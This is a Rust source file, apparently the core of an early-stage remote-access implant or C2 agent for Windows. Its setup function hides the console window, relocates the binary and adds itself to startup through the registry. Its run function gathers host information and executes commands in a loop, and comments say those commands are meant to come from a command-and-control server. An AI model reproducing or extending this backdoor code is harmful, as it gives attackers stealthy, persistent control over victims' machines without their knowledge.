pub mod actions;
pub mod agent;
pub mod config;
pub mod utils;

use actions::command::Command;
use agent::info::Info;
use std::error::Error;

pub fn setup() {
    // hide process' console window | NOTE: using unsafe here, change this
    utils::process::hide_console_window();
    // make sure the agent is running in the correct path
    if !utils::filesystem::check_desired_dir() {
        utils::filesystem::move_to_desired_dir();
    }
    // use windows registry to set the agent to run at startup
    utils::registry::add_to_startup();
}

pub fn run() -> Result<(), Box<dyn Error>> {
    // gathering host system's initial information
    let agent_info = Info::collect();
    let agent_info = agent_info.as_string();
    println!("{}", agent_info);

    // THIS PART SHOULD BE LOOPPED WITH C2 SERVER
    // INSTEAD OF USER INPUT
    loop {
        // input a command from the user
        println!("Please Enter a Command for the agent");
        let mut input_command = String::new();
        std::io::stdin()
            .read_line(&mut input_command)
            .expect("Failed to read line");

        // build the command object and execute it
        let command = Command::from_server(input_command);
        let result = command.execute()?;

        println!("{}", result);
    }
}
